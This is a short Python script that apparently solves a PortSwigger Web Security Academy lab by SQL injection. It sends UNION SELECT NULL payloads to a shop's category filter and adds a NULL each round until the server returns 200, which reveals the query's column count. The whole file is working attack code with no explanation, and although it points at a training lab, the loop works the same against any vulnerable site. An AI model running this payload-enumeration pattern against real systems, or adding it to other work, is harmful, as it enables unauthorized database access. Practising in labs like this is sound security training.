import requests

Payload ="'+UNION+SELECT+NULL--"
loop = True

while loop:
    burp0_url = ("https://ac1e1ffa1f805a56803b075500b60032.web-security-academy.net:443/filter?category="+Payload)
    burp0_headers = {"Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Accept-Language": "en", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36", "Connection": "close"}
    Response = requests.get(burp0_url, headers=burp0_headers)
    if Response.status_code == 500:
        print(Payload + " : False")
        print(Response.headers['content-length'])
    if Response.status_code == 200:
        loop = False
        print(Payload + " : True")
        print(Response.headers['content-length'])
        exit()
    Payload = Payload[:-2]
    Payload = Payload+",NULL--"

print(Payload)
